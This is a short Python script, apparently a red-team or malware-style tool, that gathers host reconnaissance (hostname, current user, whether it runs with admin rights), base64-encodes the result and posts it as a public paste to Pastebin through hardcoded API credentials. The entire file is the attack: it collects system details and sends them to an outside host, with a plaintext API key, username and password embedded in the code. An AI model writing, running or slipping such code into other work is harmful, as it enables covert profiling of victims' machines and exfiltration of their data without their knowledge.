import os
import requests
import base64
import socket
import getpass

def has_admin():
    import os
    if os.name == 'nt':
        try:
            # only windows users with admin privileges can read the C:\windows\temp
            temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\\windows'),'temp']))
        except:
            return 'No admin privileges'
        else:
            return 'Has admin privileges'
    else:
        if 'SUDO_USER' in os.environ and os.geteuid() == 0:
            return 'Has admin privileges'
        else:
            return 'No admin privileges'

def host_recon():
    hostname = socket.gethostname()
    loggedinuser = getpass.getuser()
    userprivilege = has_admin()

    text = "Host Name         : {0}\nLogged In User    : {1}\nCurrent Privileges: {2}".format(hostname, loggedinuser, userprivilege)
    
    return base64.b64encode(text.encode('UTF-8'))


def upload_data(title, data):
    api_dev_key = 'q5IAU6fGDS2L35gkdPLUlrPSiDr6ofc-'
    pastebin_username = 'FizN27'
    pastebin_password = 'Fiz_Pastebin27'

    login_form = 'https://pastebin.com/api/api_login.php'
    auth_data = {
        'api_dev_key':api_dev_key,
        'api_user_name':pastebin_username,
        'api_user_password':pastebin_password
    }

    r = requests.post(login_form, data=auth_data)
    print('Authentication successful')
    api_user_key = r.text

    print('Uploading...')
    paste_form = 'https://pastebin.com/api/api_post.php'
    paste_data = {
        'api_dev_key':api_dev_key,
        'api_option':'paste',
        'api_paste_code':data,
        'api_paste_name':title,
        'api_user_key':api_user_key,
        'api_paste_private':0
    }

    try:
        r = requests.post(paste_form, data=paste_data)
        print('Uploaded content to {0}'.format(r.text))
    except:
        print('Upload failed!')

if __name__ == "__main__":
    upload_data('result', host_recon())